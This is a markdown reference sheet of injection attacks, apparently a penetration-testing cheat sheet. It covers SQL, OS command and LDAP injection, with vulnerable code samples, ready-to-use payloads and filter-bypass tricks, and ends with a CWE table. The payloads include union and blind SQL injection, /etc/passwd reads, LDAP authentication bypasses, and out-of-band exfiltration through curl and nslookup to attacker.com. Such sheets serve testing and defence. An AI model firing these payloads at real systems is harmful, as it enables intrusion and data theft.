# Injection Attacks Reference

## SQL Injection

### Detection Patterns

**String Concatenation**:
```
# PHP
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

# Java
String query = "SELECT * FROM users WHERE id = " + request.getParameter("id");

# Python
query = "SELECT * FROM users WHERE id = %s" % user_id

# .NET
string query = "SELECT * FROM users WHERE id = " + Request["id"];
```

### Exploitation Techniques

**Union-Based**:
```sql
' UNION SELECT username, password FROM users--
' UNION SELECT null, table_name FROM information_schema.tables--
```

**Boolean-Based Blind**:
```sql
' AND 1=1--  (true condition)
' AND 1=2--  (false condition)
' AND SUBSTRING(username,1,1)='a'--
```

**Time-Based Blind**:
```sql
' AND SLEEP(5)--  (MySQL)
' AND pg_sleep(5)--  (PostgreSQL)
'; WAITFOR DELAY '0:0:5'--  (MSSQL)
```

**Error-Based**:
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND updatexml(1,concat(0x7e,(SELECT user())),1)--
```

### Database-Specific Payloads

**MySQL**:
- Version: `SELECT @@version`
- Current user: `SELECT user()`
- Databases: `SELECT schema_name FROM information_schema.schemata`

**PostgreSQL**:
- Version: `SELECT version()`
- Current user: `SELECT current_user`
- Databases: `SELECT datname FROM pg_database`

**MSSQL**:
- Version: `SELECT @@version`
- Current user: `SELECT SYSTEM_USER`
- Databases: `SELECT name FROM master..sysdatabases`

### Bypass Techniques

**WAF Bypass**:
- Case variation: `SeLeCt`
- Comments: `SEL/**/ECT`
- URL encoding: `%53%45%4C%45%43%54`
- Null bytes: `SELECT%00`

---

## Command Injection

### Detection Patterns

**Direct Injection**:
```
# PHP
system("ping " . $_GET['host']);

# Python
os.system("ping " + request.args.get('host'))

# Node.js
exec("ping " + req.query.host);
```

### Exploitation Payloads

**Command Separators**:
```
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)
```

**Newline Injection**:
```
%0awhoami
%0dwhoami
```

**Out-of-Band**:
```
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com
```

### Bypass Techniques

**Space Bypass**:
```
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
```

**Blacklist Bypass**:
```
c'a't /etc/passwd
c"a"t /etc/passwd
/???/??t /etc/passwd
```

---

## LDAP Injection

### Detection Patterns

```
# PHP
$filter = "(uid=" . $_GET['user'] . ")";
ldap_search($conn, $base_dn, $filter);
```

### Exploitation Payloads

**Authentication Bypass**:
```
*
*)(&
*)(uid=*))(|(uid=*
```

**Information Disclosure**:
```
*)(objectClass=*
*)(|(objectClass=user)(objectClass=group)
```

---

## CWE References

| Vulnerability | CWE | Name |
|---------------|-----|------|
| SQL Injection | CWE-89 | Improper Neutralization of Special Elements used in an SQL Command |
| Command Injection | CWE-78 | Improper Neutralization of Special Elements used in an OS Command |
| LDAP Injection | CWE-90 | Improper Neutralization of Special Elements used in an LDAP Query |
| XPath Injection | CWE-91 | XML Injection (aka Blind XPath Injection) |
| Header Injection | CWE-113 | Improper Neutralization of CRLF Sequences in HTTP Headers |
| Template Injection (SSTI) | CWE-1336 | Improper Neutralization of Special Elements Used in a Template Engine |
